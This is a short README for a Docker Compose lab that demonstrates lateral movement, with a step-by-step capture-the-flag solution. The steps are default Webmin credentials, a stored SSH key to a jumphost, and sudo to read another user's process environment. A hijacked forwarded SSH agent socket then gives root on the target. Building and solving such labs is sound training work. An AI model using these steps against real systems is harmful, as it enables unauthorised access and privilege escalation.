# Lateral-Movement-Example
Docker Compose Project which showcases Lateral Movement possibilities


## Solution

Log in on webmin with creds root:password on port 10000

Go to terminal

Use ssh key to log in as alice on jumphost

```
ssh -i /root/.ssh/alice alice@jumphost
```

find out about sudo

```
sudo -l
```

Find out that bob is logged in, and that he uses a forwarded ssh agent. 

```
sudo ps aux | grep ssh
sudo pstree -p bob
sudo -u bob cat /proc/20/environ
```

Use the forwarded ssh agent to log in as bob on the target machine

```
sudo SSH_AUTH_SOCK=/tmp/ssh-XXXXiyyyyy/agent.xx ssh root@target
```

output the flag

```
cat /root/flag.txt
```